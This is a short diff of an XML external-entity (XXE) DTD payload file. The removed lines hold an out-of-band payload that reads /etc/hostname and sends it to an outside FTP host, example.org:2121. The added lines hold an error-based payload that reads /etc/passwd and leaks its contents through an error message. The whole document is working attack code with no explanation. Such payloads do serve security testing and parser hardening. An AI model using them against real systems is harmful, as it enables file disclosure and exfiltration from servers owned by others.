@@ -1,2 +1,4 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
